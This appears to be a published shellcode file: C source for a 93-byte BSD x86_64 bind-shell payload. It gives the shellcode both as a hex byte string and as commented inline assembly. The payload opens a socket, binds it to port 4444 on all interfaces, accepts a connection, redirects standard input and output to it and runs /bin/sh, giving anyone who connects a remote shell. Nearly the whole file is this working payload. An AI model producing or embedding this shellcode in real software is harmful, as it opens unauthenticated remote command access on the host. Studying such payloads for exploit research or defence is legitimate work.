/*
BSD x86_64 bind_tcp shellcode, 93 bytes
Balazs Bucsay
@xoreipeip | earthquake <at@> rycon <do.t> hu  
http://rycon.hu

port = 4444
ip = 0.0.0.0

char shellcode[] = \
"\x6a\x61\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52\x48\xba\x00"
"\x02\x11\x5c\x00\x00\x00\x00\x52\x48\x89\xe6\x6a\x10\x5a\x04\x66\x0f\x05"
"\x48\x31\xf6\x6a\x6a\x58\x0f\x05\x99\x04\x1e\x0f\x05\x48\x89\xc7\x6a\x5a"
"\x58\x0f\x05\xff\xc6\x04\x5a\x0f\x05\xff\xc6\x04\x59\x0f\x05\x52\x48\xbf"
"\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x04"
"\x39\x0f\x05";
*/

int main() 
{
	asm(
	// socket(2,1,0);
	"	push $97		\n"
	"	pop %rax		\n"
	"	cltd			\n"
	"	push $0x02		\n"
	"	pop %rdi		\n"
	"	push $0x01		\n"
	"	pop %rsi		\n"
	"	syscall	   		\n"
	

	/*
	1  uint8_t 	sin_len
	1 sa_family_t 	sin_family
	2 in_port_t 	sin_port
	4 struct in_addr 	sin_addr
	8 char 	sin_zero [8]
	00 02 5C11 00000000 00000000 00000000
	5c11 => 4444
	*/
	// bind(s, struct, 16)
	"	xchg %rax, %rdi		\n"
	"	push %rdx		\n"
	"	mov $0x000000005c110200, %rdx\n"
	"	push %rdx		\n"
	"	mov %rsp, %rsi  	\n"
	"	push $16	  	\n"
	"	pop %rdx		\n"
	" 	add $102, %al		\n"
	"	syscall	   		\n"

	//listen(s, 0)
	"	xor %rsi, %rsi		\n"
	"	push $106		\n"
	"	pop %rax		\n"
	"	syscall	   		\n"

	// accept(s, 0, 0)
	"	cltd			\n"
	"	add $30, %al		\n"
	"	syscall	   		\n"

	// dup2(c, 0);
	"	mov %rax, %rdi		\n"
	"	push $90		\n"
	"	pop %rax		\n"
	"	syscall	   		\n"

	// dup2(c, 1);
	"	inc %esi		\n"
	"	add $90, %al		\n"
	"	syscall	   		\n"

	// dup2(c, 2);
	"	inc %esi		\n"
	"	add $89, %al		\n"
	"	syscall	   		\n"

	// execve("/bin/sh", {"/bin/sh", 0}, 0)
	" 	push %rdx		\n"
	"	mov $0x68732f6e69622f2f, %rdi\n"
	"	push %rdi		\n"
	"	mov %rsp, %rdi		\n"
	"	push %rdx		\n"
	"	push %rdi		\n"
	"	mov %rsp, %rsi		\n"
	"	add $57, %al		\n"
	"	syscall	   		\n"
	);
}
